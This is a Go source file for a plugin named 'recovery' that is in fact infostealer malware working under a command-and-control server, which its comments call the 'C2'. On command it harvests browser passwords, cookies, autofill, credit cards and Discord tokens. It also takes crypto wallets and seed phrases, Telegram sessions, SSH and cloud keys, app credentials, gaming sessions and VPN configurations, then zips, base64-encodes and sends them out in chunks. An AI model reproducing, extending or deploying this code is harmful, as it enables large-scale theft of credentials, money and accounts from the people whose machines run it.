package main

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"path/filepath"
	"recovery/recovery"
	"sync"
	"sync/atomic"
)

type HostInfo struct {
	ClientID string `json:"clientId"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
}

var (
	hostInfo   HostInfo
	sendFn     func(event string, payload []byte)
	mu         sync.Mutex
	collecting atomic.Bool
)

func setSend(fn func(event string, payload []byte)) {
	mu.Lock()
	sendFn = fn
	mu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	mu.Lock()
	fn := sendFn
	mu.Unlock()
	if fn == nil {
		return
	}
	data, err := json.Marshal(payload)
	if err != nil {
		log.Printf("[recovery] marshal error: %v", err)
		return
	}
	fn(event, data)
}

func handleInit(hostJSON []byte) error {
	if err := json.Unmarshal(hostJSON, &hostInfo); err != nil {
		return err
	}
	log.Printf("[recovery] init: clientId=%s os=%s arch=%s", hostInfo.ClientID, hostInfo.OS, hostInfo.Arch)
	sendEvent("ready", map[string]string{"status": "recovery plugin ready"})
	return nil
}

func handleEvent(event string, payload []byte) error {
	switch event {
	case "collect":
		go handleCollect(payload)
	case "scan_files":
		go handleScanFiles()
	case "scan_extensions":
		go handleScanExtensions()
	case "fetch_file":
		go handleFetchFile(payload)
	case "fetch_ext_zip":
		go handleFetchExtZip(payload)
	case "scan_wallets":
		go handleScanWallets()
	case "fetch_wallet_zip":
		go handleFetchWalletZip(payload)
	case "scan_telegram":
		go handleScanTelegram()
	case "fetch_telegram_zip":
		go handleFetchTelegramZip(payload)
	case "scan_keys":
		go handleScanKeys()
	case "scan_apps":
		go handleScanApps()
	case "scan_gaming":
		go handleScanGaming()
	case "scan_vpn":
		go handleScanVPN()
	case "ping":
		sendEvent("pong", nil)
	default:
		log.Printf("[recovery] unhandled event: %s", event)
	}
	return nil
}

func handleCollect(payload []byte) {
	if !collecting.CompareAndSwap(false, true) {
		log.Printf("[recovery] collection already in progress, ignoring duplicate request")
		return
	}
	defer collecting.Store(false)
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] collection panic: %v", r)
			sendEvent("error", map[string]string{"error": "internal collection error"})
		}
	}()

	var opts recovery.CollectOptions
	if len(payload) > 0 {
		json.Unmarshal(payload, &opts)
	} else {
		opts.Browsers = true
	}

	if opts.Browsers {
		noneSet := !opts.Passwords && !opts.Cookies && !opts.Autofill &&
			!opts.History && !opts.Bookmarks && !opts.CreditCards && !opts.Discord
		if noneSet {
			opts.Passwords = true
			opts.Cookies = true
			opts.Autofill = true
			opts.History = true
			opts.Bookmarks = true
			opts.CreditCards = true
			opts.Discord = true
			opts.Files = true
			opts.Wallets = true
			opts.Telegram = true
			opts.Keys = true
			opts.Apps = true
			opts.Gaming = true
			opts.VPNs = true
		}
	}

	log.Printf("[recovery] starting collection (passwords=%v cookies=%v autofill=%v history=%v bookmarks=%v cards=%v discord=%v)",
		opts.Passwords, opts.Cookies, opts.Autofill, opts.History, opts.Bookmarks, opts.CreditCards, opts.Discord)
	sendEvent("status", map[string]string{"message": "Resolving encryption keys..."})

	var extensions []recovery.ExtensionResult
	var extWg sync.WaitGroup
	if opts.Browsers {
		extWg.Add(1)
		go func() {
			defer extWg.Done()
			extensions = recovery.ScanExtensions()
		}()
	}

	partialFn := func(partial *recovery.CollectionResult) {
		sendEvent("partial", partial)
	}

	result, err := recovery.Collect(opts, partialFn)
	if err != nil {
		log.Printf("[recovery] collection failed: %v", err)
		sendEvent("error", map[string]string{"error": err.Error()})
		return
	}

	if opts.Browsers {
		extWg.Wait()
		result.Extensions = extensions
	}

	log.Printf("[recovery] collection complete: %d passwords, %d cookies, %d autofill, %d history, %d bookmarks, %d cards, %d discord tokens, %d extensions, %d wallets, %d telegram, %d keys, %d app creds",
		len(result.Passwords), len(result.Cookies), len(result.Autofill),
		len(result.History), len(result.Bookmarks), len(result.CreditCards), len(result.DiscordTokens), len(result.Extensions), len(result.Wallets), len(result.Telegram), len(result.Keys), len(result.AppCredentials))

	sendEvent("results", result)

	if len(result.Wallets) > 0 {
		go autoDownloadWallets(result.Wallets)
	}

	go func() {
		seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
		if len(seeds) > 0 {
			log.Printf("[recovery] seed scan found %d seed phrases", len(seeds))
			sendEvent("seed_scan_results", map[string]interface{}{
				"seeds": seeds,
			})
		}
	}()
}

func handleScanExtensions() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] extension scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "extension scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning extensions..."})
	exts := recovery.ScanExtensions()
	log.Printf("[recovery] extension scan complete: %d extensions", len(exts))
	sendEvent("extension_scan_results", map[string]interface{}{
		"extensions": exts,
	})
}

func handleFetchExtZip(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_ext_zip panic: %v", r)
			sendEvent("fetch_ext_zip_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path  string `json:"path"`
		ExtID string `json:"extId"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_ext_zip_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.ZipDirectory(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_ext_zip %q: %v", req.ExtID, err)
		sendEvent("fetch_ext_zip_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] zipped extension %q (%d bytes)", req.ExtID, len(data))
	sendEvent("fetch_ext_zip_result", map[string]interface{}{
		"path":    req.Path,
		"extId":   req.ExtID,
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

const maxAutoDownloadSize = 50 * 1024 * 1024 // 50MB
// Keep each plugin event small so Overlord WS/JSON doesn't drop MetaMask-sized zips.
// 2.5 MiB raw → ~3.3 MiB base64 per chunk event.
const maxWalletEventChunk = 2 * 1024 * 1024 // 2 MiB raw per event

func handleScanWallets() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] wallet scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "wallet scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning wallets..."})
	wallets := recovery.ScanWallets()
	log.Printf("[recovery] wallet scan complete: %d wallets", len(wallets))
	sendEvent("wallet_scan_results", map[string]interface{}{
		"wallets": wallets,
	})
	autoDownloadWallets(wallets)
}

// sendWalletAutoData sends one wallet zip to the server.
// Large zips are split into multiple wallet_auto_chunk events (not one huge base64 blob).
func sendWalletAutoData(w recovery.WalletResult, data []byte) {
	meta := map[string]interface{}{
		"name":      w.Name,
		"type":      w.Type,
		"path":      w.Path,
		"addresses": w.Addresses,
		"vaultData": w.VaultData,
		"size":      len(data),
	}

	if len(data) <= maxWalletEventChunk {
		log.Printf("[recovery] auto-download %q (%d bytes) → single wallet_auto_data event", w.Name, len(data))
		payload := map[string]interface{}{
			"name":      w.Name,
			"type":      w.Type,
			"path":      w.Path,
			"addresses": w.Addresses,
			"vaultData": w.VaultData,
			"size":      len(data),
			"content":   base64.StdEncoding.EncodeToString(data),
		}
		sendEvent("wallet_auto_data", payload)
		return
	}

	// Chunked transfer — Discord pipeline and C2 both reassemble on the server
	total := (len(data) + maxWalletEventChunk - 1) / maxWalletEventChunk
	log.Printf("[recovery] auto-download %q (%d bytes) → %d chunked events (event size limit)", w.Name, len(data), total)
	sendEvent("wallet_auto_chunk_start", map[string]interface{}{
		"name":      meta["name"],
		"type":      meta["type"],
		"path":      meta["path"],
		"addresses": meta["addresses"],
		"vaultData": meta["vaultData"],
		"size":      len(data),
		"chunks":    total,
	})
	for i := 0; i < total; i++ {
		start := i * maxWalletEventChunk
		end := start + maxWalletEventChunk
		if end > len(data) {
			end = len(data)
		}
		chunk := data[start:end]
		sendEvent("wallet_auto_chunk", map[string]interface{}{
			"name":  w.Name,
			"chunk": i + 1,
			"chunks": total,
			"size":  len(chunk),
			"content": base64.StdEncoding.EncodeToString(chunk),
		})
		log.Printf("[recovery] wallet_auto_chunk %q %d/%d (%d bytes)", w.Name, i+1, total, len(chunk))
	}
	sendEvent("wallet_auto_chunk_end", map[string]interface{}{
		"name":   w.Name,
		"chunks": total,
		"size":   len(data),
	})
}

func autoDownloadWallets(wallets []recovery.WalletResult) {
	// Tell the server how many wallet zips to expect (Discord pipeline waits for these)
	names := make([]string, 0, len(wallets))
	for _, w := range wallets {
		names = append(names, w.Name)
	}
	sendEvent("wallet_auto_start", map[string]interface{}{
		"count":   len(wallets),
		"names":   names,
		"wallets": wallets,
	})

	ok := 0
	for _, w := range wallets {
		if w.Size > maxAutoDownloadSize {
			log.Printf("[recovery] skipping auto-download for %q (%d bytes exceeds limit)", w.Name, w.Size)
			sendEvent("wallet_auto_skip", map[string]interface{}{
				"name":   w.Name,
				"reason": "size_limit",
				"size":   w.Size,
			})
			continue
		}
		data, err := recovery.ZipDirectory(w.Path)
		if err != nil {
			log.Printf("[recovery] auto-download zip %q: %v", w.Name, err)
			sendEvent("wallet_auto_skip", map[string]interface{}{
				"name":   w.Name,
				"reason": err.Error(),
			})
			continue
		}
		sendWalletAutoData(w, data)
		ok++
	}
	sendEvent("wallet_auto_done", map[string]interface{}{
		"expected": len(wallets),
		"sent":     ok,
		"names":    names,
	})
	log.Printf("[recovery] wallet auto-download done: sent=%d expected=%d", ok, len(wallets))
}

func handleFetchWalletZip(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_wallet_zip panic: %v", r)
			sendEvent("fetch_wallet_zip_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path string `json:"path"`
		Name string `json:"name"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_wallet_zip_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.ZipDirectory(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_wallet_zip %q: %v", req.Name, err)
		sendEvent("fetch_wallet_zip_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] zipped wallet %q (%d bytes)", req.Name, len(data))
	sendEvent("fetch_wallet_zip_result", map[string]interface{}{
		"path":    req.Path,
		"name":    req.Name,
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

func handleScanFiles() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] file scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "file scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning files..."})
	files := recovery.ScanFiles()
	log.Printf("[recovery] file scan complete: %d files", len(files))
	sendEvent("file_scan_results", map[string]interface{}{
		"files":     files,
		"truncated": len(files) >= 500,
	})
}

func handleFetchFile(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_file panic: %v", r)
			sendEvent("fetch_file_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_file_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.FetchFile(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_file %q: %v", req.Path, err)
		sendEvent("fetch_file_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] fetched %q (%d bytes)", req.Path, len(data))
	sendEvent("fetch_file_result", map[string]interface{}{
		"path":    req.Path,
		"name":    filepath.Base(req.Path),
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

func handleScanTelegram() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] telegram scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "telegram scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning Telegram sessions..."})
	sessions := recovery.ScanTelegram()
	log.Printf("[recovery] telegram scan complete: %d accounts", len(sessions))
	sendEvent("telegram_scan_results", map[string]interface{}{
		"sessions": sessions,
	})
	for _, s := range sessions {
		if s.Size > maxAutoDownloadSize {
			log.Printf("[recovery] skipping telegram auto-download for %q (%d bytes exceeds limit)", s.Account, s.Size)
			continue
		}
		data, err := recovery.ZipTelegram(s.Path)
		if err != nil {
			log.Printf("[recovery] telegram zip %q: %v", s.Account, err)
			continue
		}
		log.Printf("[recovery] telegram auto-download %q (%d bytes)", s.Account, len(data))
		sendEvent("telegram_data", map[string]interface{}{
			"account": s.Account,
			"path":    s.Path,
			"size":    len(data),
			"content": base64.StdEncoding.EncodeToString(data),
		})
	}
}

func handleFetchTelegramZip(payload []byte) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] fetch_telegram_zip panic: %v", r)
			sendEvent("fetch_telegram_zip_error", map[string]string{"error": "internal error"})
		}
	}()

	var req struct {
		Path    string `json:"path"`
		Account string `json:"account"`
	}
	if err := json.Unmarshal(payload, &req); err != nil || req.Path == "" {
		sendEvent("fetch_telegram_zip_error", map[string]string{"error": "invalid request"})
		return
	}

	data, err := recovery.ZipTelegram(req.Path)
	if err != nil {
		log.Printf("[recovery] fetch_telegram_zip %q: %v", req.Account, err)
		sendEvent("fetch_telegram_zip_error", map[string]string{"path": req.Path, "error": err.Error()})
		return
	}

	log.Printf("[recovery] zipped telegram %q (%d bytes)", req.Account, len(data))
	sendEvent("telegram_data", map[string]interface{}{
		"account": req.Account,
		"path":    req.Path,
		"size":    len(data),
		"content": base64.StdEncoding.EncodeToString(data),
	})
}

func handleScanKeys() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] key scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "key scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning SSH & cloud keys..."})
	keys := recovery.ScanKeys()
	log.Printf("[recovery] key scan complete: %d keys", len(keys))
	sendEvent("key_scan_results", map[string]interface{}{
		"keys": keys,
	})
}

func handleScanApps() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] app scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "app credential scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning app credentials..."})
	apps := recovery.ScanApps()
	log.Printf("[recovery] app scan complete: %d credentials", len(apps))
	sendEvent("app_scan_results", map[string]interface{}{
		"appCredentials": apps,
	})
}

func handleScanGaming() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] gaming scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "gaming scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning gaming platforms..."})
	gaming := recovery.ScanGaming()
	sendEvent("gaming_scan_results", map[string]interface{}{
		"gaming": gaming,
	})
	if gaming == nil {
		return
	}
	autoDownloadGaming(gaming)
}

func autoDownloadGaming(gaming *recovery.GamingResult) {
	type zipJob struct {
		name string
		fn   func() ([]byte, error)
	}
	var jobs []zipJob

	if gaming.Steam != nil && gaming.Steam.SteamPath != "" {
		steamPath := gaming.Steam.SteamPath
		jobs = append(jobs, zipJob{"steam", func() ([]byte, error) { return recovery.ZipSteamSession(steamPath) }})
	}
	if len(gaming.BattleNet) > 0 {
		jobs = append(jobs, zipJob{"battlenet", recovery.ZipBattleNet})
	}
	if len(gaming.Epic) > 0 {
		jobs = append(jobs, zipJob{"epic", recovery.ZipEpic})
	}
	if len(gaming.Riot) > 0 {
		jobs = append(jobs, zipJob{"riot", recovery.ZipRiot})
	}
	if len(gaming.Uplay) > 0 {
		jobs = append(jobs, zipJob{"uplay", recovery.ZipUplay})
	}

	for _, j := range jobs {
		data, err := j.fn()
		if err != nil || len(data) == 0 {
			log.Printf("[recovery] gaming zip %s: %v", j.name, err)
			continue
		}
		if len(data) > maxAutoDownloadSize {
			log.Printf("[recovery] gaming zip %s too large (%d bytes), skipping", j.name, len(data))
			continue
		}
		log.Printf("[recovery] gaming auto-download %s (%d bytes)", j.name, len(data))
		sendEvent("gaming_data", map[string]interface{}{
			"platform": j.name,
			"size":     len(data),
			"content":  base64.StdEncoding.EncodeToString(data),
		})
	}
}

func handleScanVPN() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[recovery] vpn scan panic: %v", r)
			sendEvent("error", map[string]string{"error": "vpn scan error"})
		}
	}()
	sendEvent("status", map[string]string{"message": "Scanning VPN configurations..."})
	vpns := recovery.ScanVPNs()
	sendEvent("vpn_scan_results", map[string]interface{}{
		"vpns": vpns,
	})
}

func handleUnload() {
	log.Printf("[recovery] unloading")
}

func main() {}
